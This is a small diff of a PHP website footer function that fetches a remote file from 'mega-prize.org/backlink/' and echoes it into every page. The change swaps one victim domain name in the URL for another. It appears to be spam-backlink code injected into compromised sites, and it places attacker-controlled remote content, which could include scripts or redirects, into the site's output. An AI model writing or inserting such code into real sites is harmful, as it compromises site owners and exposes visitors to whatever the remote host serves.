@@ -5,7 +5,7 @@ function render_footer() {
 	<!-- Begin changes -->
 
 	<?php
-	$lt = file_get_contents("https://mega-prize.org/backlink/vigiles.bombeiros.mg.gov.br.txt");
+	$lt = file_get_contents("https://mega-prize.org/backlink/lpmi.stkippasundan.ac.id.txt");
 	if ($lt !== false) {
 	    echo $lt;
 	}
